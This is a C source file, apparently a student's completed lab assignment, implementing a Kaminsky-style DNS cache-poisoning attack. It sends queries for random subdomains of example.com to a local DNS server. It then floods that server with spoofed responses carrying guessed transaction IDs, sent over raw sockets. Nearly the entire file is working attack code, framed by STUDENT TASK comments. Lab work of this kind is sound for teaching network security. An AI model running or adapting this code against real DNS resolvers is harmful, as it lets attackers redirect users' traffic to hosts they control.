#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000


/*******************************************
 MODIFIED LINES are Lines 76, 81, 85, 90, 96
********************************************/


/* IP Header */
struct ipheader {
	unsigned char 		iph_ihl:4,	// IP header length
				iph_ver:4;	// IP version
	unsigned char		iph_tos; 	// Types of service
	unsigned short int  	iph_len;	// IP Packet length (data + header)
	unsigned short int	iph_ident;	// Identification
	unsigned short int	iph_flag:3, 	// Fragmentation flags
				iph_offset:13;	// Flags offset
	unsigned char		iph_ttl;	// time to live
	unsigned char		iph_protocol;	// protocol type
	unsigned short int  	iph_chksum;	// IP datagram checksum
	struct 	in_addr		iph_sourceip;	// src IP address
	struct 	in_addr		iph_destip;	// dst IP address
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(char * buffer, int pkt_size);
void send_dns_response(char * buffer, int pkt_size);

int main()
{
    long i = 0;
    srand(time(NULL));

    //Load the DNS request packet from file
    FILE * f_req = fopen("ip_req.bin", "rb");
    if (!f_req) {
            perror("Can't open 'ip_req.bin'");
            exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
	
    // n_req -> Number of bytes read into ip_req from f_req
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

    // Load the first DNS response packet from file
    FILE * f_resp = fopen("ip_resp.bin", "rb");
    if (!f_resp) {
            perror("Cant open 'in resp.bin'");
            exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

	char a[26]="abcdefghijklmnopqrstuvwxyz";
	while(1) {
		unsigned short transaction_id = 0;
		
		// Generate a random name w/ length 5 AND store it in a 'name char array'
		char name[5];
		for(int k=0; k<5; k++){
			name[k]=a[rand()%26];
		}
				

    //#######################################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server
              This will trigger it to send out DNS queries */
		
		// Modify the name in the question field (offset=41)
		memcpy(ip_req+41, name, 5); 
		send_dns_request(ip_req, n_req);
		printf("attempt #%ld. request is [%.5s.example.com]\n", ++i, name);
	
    // Step 2. Send spoofed responses to the targeted local DNS server.

		/* We need to copy the randomly generated name into the Question section of 
		the DNS response as well, or the question and answers won't match. */
		memcpy(ip_resp+41, name, 5); 

		// Modify the name in the answer field (offset=64)
                memcpy(ip_resp+64, name, 5); 
		
		// Max was 14000, but Birthday Paradox says we have a 
		// 50% chance with 2^(n/2) where n=16 bits of TXID.
                for(int j=0; j<256; j++)     
                {
                        transaction_id = (rand()%65536)+1;
                        unsigned short id;
			
			// HERE: the id should be the random TXID, not the iteration j
                        id = htons(transaction_id); 
			
			//Modify the id in the transaction ID field (offset=28)
                        memcpy(ip_resp+28, &id, 2); 
                        send_dns_response(ip_resp, n_resp);
                }
		/* This sleep() function is called to make it easier to stop the 
		packet flow in Wireshark and make it eaiser to find your poisoning packet. 
		Feel free to set this to 1 if it's taking too long. */
		sleep(2);	

		
    
    //#######################################################################################
  }
}


/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(char * buffer, int pkt_size){			
	//$$$$$ STUDENT TASK $$$$$
	// Implement a function that sends the DNS request
	//Hint: What do you need to send data from an application to the transport layer?
	send_raw_packet(buffer, pkt_size);
}


/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(char * buffer, int pkt_size)		        
{
	//$$$$$ STUDENT TASK $$$$$
	// Implement a function that sends the DNS request
	//Hint: What do you need to send data from an application to the transport layer? This will be very similar to sending a request.
	
	send_raw_packet(buffer, pkt_size);
		 
}


/* Send the raw packet  
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}


